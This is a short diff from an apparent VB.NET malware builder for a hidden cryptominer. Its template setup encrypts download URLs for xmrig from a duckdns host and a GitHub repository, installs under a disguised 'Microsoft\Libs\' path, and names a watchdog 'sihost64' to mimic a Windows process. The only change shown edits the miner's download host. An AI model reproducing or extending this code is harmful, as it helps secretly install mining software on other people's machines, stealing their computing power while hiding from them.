@@ -348,7 +348,7 @@ Public Class Codedom
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#URL", F.EncryptString("http://ahmedzx5.duckdns.org:8033/Project/project/Resources/xmrig"))
+        stringb.Replace("#URL", F.EncryptString("http://ahme.dzx5.duckdns.org:8033/Project/project/Resources/xmrig"))
         stringb.Replace("#MINERURL", F.EncryptString("https://github.com/Ahmedzx555/XMR/raw/main/Project/project/Resources/xmrig.zip"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
